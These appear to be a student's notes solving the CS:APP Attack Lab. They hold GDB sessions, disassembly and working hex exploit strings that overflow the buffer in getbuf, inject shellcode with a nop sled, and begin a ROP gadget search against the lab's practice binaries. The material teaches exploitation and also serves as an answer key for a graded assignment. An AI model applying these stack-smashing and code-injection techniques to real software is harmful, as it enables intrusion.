# Attack Lab

## `hex2raw`

Converts whitespace separated digits representing byte values to raw bytes.

### Example

```shell
🐳 ❯ echo "30 31 32 33" | ./hex2raw | hexdump -v -e '/1 "%02x "' | awk '{for (i=1; i<=NF; i++) printf "%c", ("0x" $i)+0}'
0123
```

### Usage

```shell
🐳 ❯ ./hex2raw < exploit > exploit.bin
🐳 ❯ ./ctarget -q < exploit.bin
```

```shell
🐳 ❯ ./ctarget -qi exploit.bin
```

```shell
🐳 ❯ cat exploit | ./hex2raw | ./ctarget -q
```

Can also be used while running `GDB`

```shell
🐳 ❯ gdb ctarget
(gdb) run -q < exploit.bin
```

- `ctarget` and `rtarget` must be run using the `-q` option so that they don't try to contact the grading server.

## Phase 1 (`ctarget`)

```shell
🐳 ❯ ./ctarget -qi exploit.phase1.bin
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp                   # Allocate 40 bytes on the stack
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp                    # 🎯 [TARGET]
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)
  4017cb:	00 00 00
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>

...

0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp                    # 👨‍💻 [START]
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	call   4017a8 <getbuf>              # push return address 0x401976 onto the stack
  401976:	89 c2                	mov    %eax,%edx
  401978:	be 88 31 40 00       	mov    $0x403188,%esi
  40197d:	bf 01 00 00 00       	mov    $0x1,%edi
  401982:	b8 00 00 00 00       	mov    $0x0,%eax
  401987:	e8 64 f4 ff ff       	call   400df0 <__printf_chk@plt>
  40198c:	48 83 c4 08          	add    $0x8,%rsp
  401990:	c3                   	ret
  401991:	90                   	nop
  401992:	90                   	nop
  401993:	90                   	nop
  401994:	90                   	nop
  401995:	90                   	nop
  401996:	90                   	nop
  401997:	90                   	nop
  401998:	90                   	nop
  401999:	90                   	nop
  40199a:	90                   	nop
  40199b:	90                   	nop
  40199c:	90                   	nop
  40199d:	90                   	nop
  40199e:	90                   	nop
  40199f:	90                   	nop
```

### Notes

Show state of stack after calling `getbuf` from `test`

- Can see return `test` return address `0x401976` at `0x5561dca0` on the stack

```shell
(gbd) break getbuf
(gdb) run -q
(gdb) display /12gx $rsp
2: x/12xg $rsp
0x5561dca0:     0x0000000000401976      0x0000000055685fe8
0x5561dcb0:     0x0000000000401f24      0x0000000000000000
0x5561dcc0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcf0:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4

(gdb) x/2i $rip
=> 0x4017a8 <getbuf>:   sub    $0x28,%rsp
   0x4017ac <getbuf+4>: mov    %rsp,%rdi
(gdb) stepi
(gdb) x/12gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) x/2i $rip
=> 0x4017ac <getbuf+4>: mov    %rsp,%rdi
   0x4017af <getbuf+7>: call   0x401a40 <Gets>
(gdb) nexti
(gdb) nexti
Type string:abcdefgh12345678123456781234567812345678ijklmnop
(gdb) x/12gx $rsp
0x5561dc78:     0x6867666564636261      0x3837363534333231
0x5561dc88:     0x3837363534333231      0x3837363534333231
0x5561dc98:     0x3837363534333231      0x706f6e6d6c6b6a69
0x5561dca8:     0x0000000055685f00      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

Can overwrite the return address by supplying at least `0x28` bytes and then the desired new return address `0x4017c0`

- `0000000000000000000000000000000000000000` + `00000000004017c0`
- `0000000000401976` = `c0 17 40 00 00 00 00 00`
- Probably don't need to include the NULs can just provide the first 3 bytes to form the address

```shell
🐳 ❯ echo "c0 17 40" | ./hex2raw | hexdump -v -e '/1 "%02x "' | awk '{for (i=1; i<=NF; i++) printf "%c", ("0x" $i)+0}'
�@
```

- `73 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 65 c0 17 40`
- `szzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzze�@`
- Mark start `s` and end `e` of stack space allocated by `getbuf`

```shell
🐳 ❯ gdb ctarget
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run -q < exploit.phase1.bin
Starting program: /csapp/labs/attacklab/ctarget -q < exploit.phase1.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12y
(gdb) x/5i $rip
=> 0x4017a8 <getbuf>:   sub    $0x28,%rsp
   0x4017ac <getbuf+4>: mov    %rsp,%rdi
   0x4017af <getbuf+7>: call   0x401a40 <Gets>
   0x4017b4 <getbuf+12>:        mov    $0x1,%eax
   0x4017b9 <getbuf+17>:        add    $0x28,%rsp
(gdb) nexti
14      in buf.c
(gdb) x/12gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
(gdb) nexti
0x00000000004017af      14      in buf.c
(gdb) nexti
16      in buf.c
(gdb) x/12gx $rsp
0x5561dc78:     0x7a7a7a7a7a7a7a73      0x7a7a7a7a7a7a7a7a
0x5561dc88:     0x7a7a7a7a7a7a7a7a      0x7a7a7a7a7a7a7a7a
0x5561dc98:     0x657a7a7a7a7a7a7a      0x00000000004017c0
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4

(gdb) continue
Continuing.
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 C0 17 40
[Inferior 1 (process 3574) exited normally]
```

## Phase 2 (`ctarget`)

```asm
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp                    # 🎯 [TARGET]
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)
  4017f9:	00 00 00
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	call   400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	call   401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	call   400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	call   401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	call   400e40 <exit@plt>
```

The phase 1 exploit can be adjusted to target the `touch2` function instead

- `73 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 65 ec 17 40`

However, we now need to also inject code to set the first argument (`rdi`) passed to `touch2`, to the value of `cookie`.

Simply changing the return address results in

```shell
🐳 ❯ ./ctarget -qi exploit.phase2.bin
Cookie: 0x59b997fa
Misfire: You called touch2(0x32b852a0)
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:2:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 EC 17 40
```

From disassembly can see `cookie` is at address `0x6044e4`

```asm
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
```

To test this whilst stepping through with `GDB` can set the value of `rdi` to `cookie` before executing the `cmp` instruction

```shell
🐳 ❯ gdb ctarget
(gdb) break touch2
(gdb) run -q < exploit.phase2.bin
Starting program: /csapp/labs/attacklab/ctarget -q < exploit.phase2.bin
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Breakpoint 1, touch2 (val=4158666976) at visible.c:40
(gdb) set $rdi = *0x6044e4
(gdb) continue
Continuing.
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:73 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 7A 65 EC 17 40
[Inferior 1 (process 479) exited normally]
```

Need to set return address from `getbuf` to address of exploit that sets `rdi` to `cookie` and then returns to `touch2`

```asm
movl (0x6044e4), %edi
push 0x4017ec
ret
nop
```

To generate the byte codes for these instructions, assemble and disassemble the exploit code

```shell
🐳 ❯ gcc -c phase2.code.s
🐳 ❯ objdump -d phase2.code.o > phase2.code.disassembly.asm
```

```asm
0000000000000000 <.text>:
   0:	8b 3c 25 e4 44 60 00 	mov    0x6044e4,%edi
   7:	ff 34 25 ec 17 40 00 	push   0x4017ec
   e:	c3                   	ret
   f:	90                   	nop
```

Should be able to change exploit to make return address point to instructions on the stack, padded with `nop` instructions

- `0x5561dc78` is `rsp` when filling the buffer

- [nop sled] [movl] [push] [ret] [address of nop sled]
- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [00 60 44 e4 25 3c 8b] [00 40 17 ec 25 34 ff] [c3] [78 dc 61 55]`

```shell
(gdb) x/12gx $rsp
0x5561dc78:     0x9090909090909090      0x9090909090909090
0x5561dc88:     0x9090909090909090      0x008b3c25e4446000
0x5561dc98:     0x78c3ff3425ec1740      0x00000000005561dc
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

Looks like the return address hasn't been aligned properly, need an extra `nop`?

```shell
(gdb) x/12gx $rsp
0x5561dc78:     0x9090909090909090      0x9090909090909090
0x5561dc88:     0x9090909090909090      0x8b3c25e444600090
0x5561dc98:     0xc3ff3425ec174000      0x000000005561dc78
0x5561dca8:     0x0000000055685fe8      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

...looks better?

Yep that worked, `rip` was set to `0x5561dc78`, however, looks like the instructions have been sent in the wrong endianess

```shell
(gdb) x/19xb $rip
0x5561dc91:     0x00    0x60    0x44    0xe4    0x25    0x3c    0x8b    0x00
0x5561dc99:     0x40    0x17    0xec    0x25    0x34    0xff    0xc3    0x78
0x5561dca1:     0xdc    0x61    0x55
```

First instruction after nop sled showing as

```asm
0x5561dc91  add %ah,0x44(%rax)
```

Need to fix the way the instructions are ordered...

- `[00 60 44 e4 25 3c 8b] [00 40 17 ec 25 34 ff] [c3] [78 dc 61 55]`
- `[8b 3c 25 e4 44 60 00] [ff 34 25 ec 17 40 00] [c3] [78 dc 61 55]`

This failed with a segfault... try with `pushq` to see if its alignment issue

```asm
0000000000000000 <.text>:
   0:	48 8b 3c 25 e4 44 60 	mov    0x6044e4,%rdi
   7:	00
   8:	ff 34 25 ec 17 40 00 	push   0x4017ec
   f:	c3                   	ret
```

- [nop sled] [movq] [padding] [pushq] [ret] [address of nop sled]
- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [48 8b 3c 25 e4 44 60] [00] [ff 34 25 ec 17 40 00] [c3] [78 dc 61 55]`

Oh was probably not pushing an immediate value onto the stack, need to prefix with `$`

```asm
0000000000000000 <.text>:
   0:	48 8b 3c 25 e4 44 60 	mov    0x6044e4,%rdi
   7:	00
   8:	68 ec 17 40 00       	push   $0x4017ec
   d:	c3                   	ret
```

- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [48 8b 3c 25 e4 44 60] [00] [68 ec 17 40 00] [c3] [78 dc 61 55]`
- The push bytes have shrunk so might need to fix nop sled....
- Yep, requires 2 more bytes of padding now
- `[90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90] [48 8b 3c 25 e4 44 60] [00] [68 ec 17 40 00] [c3] [78 dc 61 55]`

```shell
🐳 ❯ ./ctarget -qi phase2.exploit.bin
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 48 8B 3C 25 E4 44 60 00 68 EC 17 40 00 C3 78 DC 61 55
```

## Phase 3

This phase requires executing `touch3` and passing a string representation of the cookie as its argument (via `rdi`)

```asm
000000000040184c <hexmatch>:
  40184c:	41 54                	push   %r12
  40184e:	55                   	push   %rbp
  40184f:	53                   	push   %rbx
  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp     # rsp += -128 (buffer for snprintf)
  401854:	41 89 fc             	mov    %edi,%r12d
  401857:	48 89 f5             	mov    %rsi,%rbp
  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401861:	00 00
  401863:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
  401868:	31 c0                	xor    %eax,%eax
  40186a:	e8 41 f5 ff ff       	call   400db0 <random@plt>
  40186f:	48 89 c1             	mov    %rax,%rcx
  401872:	48 ba 0b d7 a3 70 3d 	movabs $0xa3d70a3d70a3d70b,%rdx
  401879:	0a d7 a3
  40187c:	48 f7 ea             	imul   %rdx
  40187f:	48 01 ca             	add    %rcx,%rdx
  401882:	48 c1 fa 06          	sar    $0x6,%rdx
  401886:	48 89 c8             	mov    %rcx,%rax
  401889:	48 c1 f8 3f          	sar    $0x3f,%rax
  40188d:	48 29 c2             	sub    %rax,%rdx
  401890:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  401894:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401898:	48 c1 e0 02          	shl    $0x2,%rax
  40189c:	48 29 c1             	sub    %rax,%rcx
  40189f:	48 8d 1c 0c          	lea    (%rsp,%rcx,1),%rbx
  4018a3:	45 89 e0             	mov    %r12d,%r8d
  4018a6:	b9 e2 30 40 00       	mov    $0x4030e2,%ecx
  4018ab:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
  4018b2:	be 01 00 00 00       	mov    $0x1,%esi
  4018b7:	48 89 df             	mov    %rbx,%rdi
  4018ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4018bf:	e8 ac f5 ff ff       	call   400e70 <__sprintf_chk@plt>
  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
  4018c9:	48 89 de             	mov    %rbx,%rsi
  4018cc:	48 89 ef             	mov    %rbp,%rdi
  4018cf:	e8 cc f3 ff ff       	call   400ca0 <strncmp@plt>
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	0f 94 c0             	sete   %al
  4018d9:	0f b6 c0             	movzbl %al,%eax
  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  4018e8:	00 00
  4018ea:	74 05                	je     4018f1 <hexmatch+0xa5>
  4018ec:	e8 ef f3 ff ff       	call   400ce0 <__stack_chk_fail@plt>
  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
  4018f5:	5b                   	pop    %rbx
  4018f6:	5d                   	pop    %rbp
  4018f7:	41 5c                	pop    %r12
  4018f9:	c3                   	ret

...

00000000004018fa <touch3>:
  4018fa:	53                   	push   %rbx
  4018fb:	48 89 fb             	mov    %rdi,%rbx
  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905:	00 00 00
  401908:	48 89 fe             	mov    %rdi,%rsi
  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911:	e8 36 ff ff ff       	call   40184c <hexmatch>
  401916:	85 c0                	test   %eax,%eax
  401918:	74 23                	je     40193d <touch3+0x43>
  40191a:	48 89 da             	mov    %rbx,%rdx
  40191d:	be 38 31 40 00       	mov    $0x403138,%esi
  401922:	bf 01 00 00 00       	mov    $0x1,%edi
  401927:	b8 00 00 00 00       	mov    $0x0,%eax
  40192c:	e8 bf f4 ff ff       	call   400df0 <__printf_chk@plt>
  401931:	bf 03 00 00 00       	mov    $0x3,%edi
  401936:	e8 52 03 00 00       	call   401c8d <validate>
  40193b:	eb 21                	jmp    40195e <touch3+0x64>
  40193d:	48 89 da             	mov    %rbx,%rdx
  401940:	be 60 31 40 00       	mov    $0x403160,%esi
  401945:	bf 01 00 00 00       	mov    $0x1,%edi
  40194a:	b8 00 00 00 00       	mov    $0x0,%eax
  40194f:	e8 9c f4 ff ff       	call   400df0 <__printf_chk@plt>
  401954:	bf 03 00 00 00       	mov    $0x3,%edi
  401959:	e8 f1 03 00 00       	call   401d4f <fail>
  40195e:	bf 00 00 00 00       	mov    $0x0,%edi
  401963:	e8 d8 f4 ff ff       	call   400e40 <exit@plt>
```

## To inspect via `GDB` adjust the phase 1 exploit to point to the address of `touch3`

- `73 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 7a 65 fa 18 40`

- Stepping through `touch3` and `hexmatch`, it appears that only the first 8 bytes of the exploit string, [73 7a 7a 7a 7a 7a 7a 7a] are preserved after pushing the callee
  saved registers onto the stack in `hexmatch`

```shell
(gdb) x/12gx $rsp-64
0x5561dc40:     0x000000005561dc78      0x000000005561dca3
0x5561dc50:     0x0000000000401a8a      0x0000000055586000
0x5561dc60:     0x0000000055685fe8      0x0000000000000002
0x5561dc70:     0x00000000004017b4      0x7a7a7a7a7a7a7a73 # <- here at 0x5561dc78
0x5561dc80:     0x00007ffff7e038e0      0x0000000055685fe8
0x5561dc90:     0x0000000000000002      0x0000000000401916
```

- Can see the expected string passed to `strncmp` is

```shell
(gdb) x/s $rsi
0x5561dc13:     "59b997fa"
```

So need to construct an exploit string, that will

- Place the bytes representing `"59b997fa"` at position `0x5561dc78` followed by null byte to terminate the string
- Place exploit code between string and address of exploit code

  - Exploit code needs setup `rdi` to point to cookie string
  - Needs to push address of `touch3`, and then call `ret`

- "59b997fa" -> [35 39 62 39 39 37 66 61]

```asm
movabs  $0x3539623939376661, %rax           # push string bytes to register
movq    %rax, (0x5561dc78)                  # move string bytes to stack position
movq    $0x5561dc78, %rdi                   # set rdi to &string
push    $0x4018fa                           # push touch3 return address
ret                                         # return
```

```asm
0000000000000000 <.text>:
   0:	48 b8 61 66 37 39 39 	movabs $0x3539623939376661,%rax
   7:	62 39 35
   a:	48 89 04 25 78 dc 61 	mov    %rax,0x5561dc78
  11:	55
  12:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi
  19:	68 fa 18 40 00       	push   $0x4018fa
  1e:	c3                   	ret

```

- [cookie string] [movabs] [mov] [mov] [push] [instructions address]
- `[48 b8 61 66 37 39 39 62 39 35] [48 89 04 25 78 dc 61 55] [48 c7 c7 78 dc 61 55] [68 fa 18 40 00] [c3] [???]`
- Need to inspect what instruction address should be
- Have used placeholder address of `31 32 33 34 35 36 37 38 39`

```shell
(gdb) x/6gx $rsp
0x5561dc78:     0x39623939376661b8      0x61dc782504894835
0x5561dc88:     0x5561dc78c7c74855      0x3231c3004018fa68
0x5561dc98:     0x0000383736353433      0x0000000000401976
```

- Looks like need 9 bytes of padding after instructions?
- And address of instructions is `0x5561dc78`

- `[48 b8 61 66 37 39 39] [62 39 35] [48 89 04 25 78 dc 61] [55] [48 c7 c7 78 dc 61 55] [68 fa 18 40 00] [c3] [00 00 00 00 00 00 00 00 00] [78 dc 61 55]`

Even though the string is not yet null terminated, can see after the `mov %rax,0x5561dc78` instruction that the string is there but backwards

```shell
(gdb) x/8bc 0x5561dc78
0x5561dc78:     97 'a'  102 'f' 55 '7'  57 '9'  57 '9'  98 'b'  57 '9'  53 '5'
```

- Need to reverse the bytes in the movabs instruction
- Also need to include a '\0' NUL byte
  - This would have to be place at the exact address `0x5561dc80`
  - Need to step through and see what this value is and if its okay to overwrite
  - Okay `hexmatch` overwrites the value at `0x5561dc78`, so do I need to place the value past the stack space it allocates?
  - `rsp` is at `0x5561dc00` after it allocates its 128 bytes on the stack, so store below that?
  - And also make the next byte zero'd out for the null byte?

```asm
movabs  $0x6166373939623935, %rax           # push string bytes to register
movq    $0x5561dbf0, %rdi                   # set rdi to &string
movq    %rax, (%rdi)                        # move string bytes to stack position
movl    $0, 8(%rdi)                         # NUL terminate string (movl will clear upper 4 bytes)
push    $0x4018fa                           # push touch3 return address
ret                                         # return
```

```asm
0000000000000000 <.text>:
   0:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   7:	37 66 61
   a:	48 c7 c7 f0 db 61 55 	mov    $0x5561dbf0,%rdi
  11:	48 89 07             	mov    %rax,(%rdi)
  14:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%rdi)
  1b:	68 fa 18 40 00       	push   $0x4018fa
  20:	c3                   	ret
```

- `[movabs] [mov] [mov] [movl] [push] [ret] [instruction address]`
- `[48 b8 35 39 62 39 39 37 66 61] [48 c7 c7 f0 db 61 55] [48 89 07] [c7 47 08 00 00 00 00] [68 fa 18 40 00] [c3] [???]`
- Need to determine new instruction address and any padding required

```shell
(gdb) x/6gx $rsp
0x5561dc78:     0x373939623935b848      0x61dbf0c7c7486166
0x5561dc88:     0x000847c707894855      0x004018fa68000000
0x5561dc98:     0x37363534333231c3      0x0000000000400038
```

- Can see we need 7 bytes padding to push the mock return address [31 32 33 34 35 36 37 38] to fit into the return address memory
- The address of the start of the exploit is the same
- Going to fill with `nop` this time
- `[48 b8 35 39 62 39 39 37 66 61] [48 c7 c7 f0 db 61 55] [48 89 07] [c7 47 08 00 00 00 00] [68 fa 18 40 00] [c3] [90 90 90 90 90 90 90] [78 dc 61 55]`

- Okay can't do that
- `hexmatch` calls `srandom` which then also allocates things on the stack which overwrites our string
- `hexmatch` allocates `128` bytes on the stack, and the labsheet says the original `C` code only specifys `cbfuf[110]`
- Could that remaining 18 bytes be used?
- From the disassembly, can see theres a canary used at 0x78 (120)
- So does that leave 10 bytes available to be used?
- Would need to find the address of the 10 bytes...

- Oh... can I just move the stack pointer to below my string so it doesn't get overwritten?

- Or can I just place it above the stack pointer so that it never gets accessed again?
- `0x5561dca8` is the address below `rsp` during `getbuf`, will get decremented to when `ret` sends to instructions
- Try 1 more up `0x5561dcb0` which is below `rsp` at start of `touch3`?

```asm
movabs  $0x6166373939623935, %rax           # push string bytes to register
movq    $0x5561dcb0, %rdi                   # set rdi to &string
movq    %rax, (%rdi)                        # move string bytes to stack position
movl    $0, 8(%rdi)                         # NUL terminate string (movl will clear upper 4 bytes)
push    $0x4018fa                           # push touch3 return address
ret                                         # return
```

```asm
0000000000000000 <.text>:
   0:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
   7:	37 66 61
   a:	48 c7 c7 b0 dc 61 55 	mov    $0x5561dcb0,%rdi
  11:	48 89 07             	mov    %rax,(%rdi)
  14:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%rdi)
  1b:	68 fa 18 40 00       	push   $0x4018fa
  20:	c3                   	ret
```

- `[48 b8 35 39 62 39 39 37 66 61] [48 c7 c7 b0 dc 61 55] [48 89 07] [c7 47 08 00 00 00 00] [68 fa 18 40 00] [c3] [90 90 90 90 90 90 90] [78 dc 61 55]`

```shell
🐳 ❯ ./ctarget -qi phase3.exploit.bin
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 B8 35 39 62 39 39 37 66 61 48 C7 C7 B0 DC 61 55 48 89 07 C7 47 08 00 00 00 00 68 FA 18 40 00 C3 90 90 90 90 90 90 90 78 DC 61 55
```

## Phase 4 (`rtarget`)

This phase will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from the gadget farm (`farm.c`)

- Can be done with just two gadgets
- Use only first 8 registers `rax` - `rdi`
- Use only instructions `movq`, `popq`, `ret`, `nop` (see labsheet for encodings)
- `When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit string will contain a combination of gadget addresses and data.`

- So need to overwrite the return address from `getbuf` like in Phase1, but instead of to `touch1` to some gadget
- This will pop form the stack and decrement `rsp`
- Can we then place gadget addresses and data above the return address, so that `rsp` is now pointing at them
- The gadgets will push/pop from them as the execute instructions and return
- The second (final) gadget should have `rsp` point at the address of `phase2` when it calls `ret`

- [padding] [gadget address] [gadget addresses / data]
- `[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00] [?? ?? ?? ??] [???]`

- Want something to the effect of

```asm
popq    %rdi    # rsp pointing to cookie value
ret             # rsp pointing to touch2
```

```asm
0000000000000000 <.text>:
   0:	5f                   	pop    %rdi
   1:	c3                   	ret
```

- Can search the end of gadgets for `5f c3`?
- Nope no `5f` in the farm
- What about moving something into `rdi`?

```asm
movq    %rax, %rdi
movq    %rcx, %rdi
movq    %rdx, %rdi
movq    %rbx, %rdi
movq    %rsp, %rdi
movq    %rbp, %rdi
movq    %rsi, %rdi
```

```asm
0000000000000000 <.text>:
   0:	48 89 c7             	mov    %rax,%rdi
   3:	48 89 cf             	mov    %rcx,%rdi
   6:	48 89 d7             	mov    %rdx,%rdi
   9:	48 89 df             	mov    %rbx,%rdi
   c:	48 89 e7             	mov    %rsp,%rdi
   f:	48 89 ef             	mov    %rbp,%rdi
  12:	48 89 f7             	mov    %rsi,%rdi
```

- Look for `48 89 xx` in gadget farm

```asm
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3
  # [48 89 c7 c3] -> [movq %rax, %rdi] [ret]

...

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3
  # [48 89 c7 90 c3] -> [movq %rax, %rdi] [nop] [ret]
```

- So can we find `popq %rax` right before a `ret`, so we can then run the `movq %rax, %rdi` gadget?

```asm
0000000000000000 <.text>:
   0:	58                   	pop    %rax
   1:	c3                   	ret
```

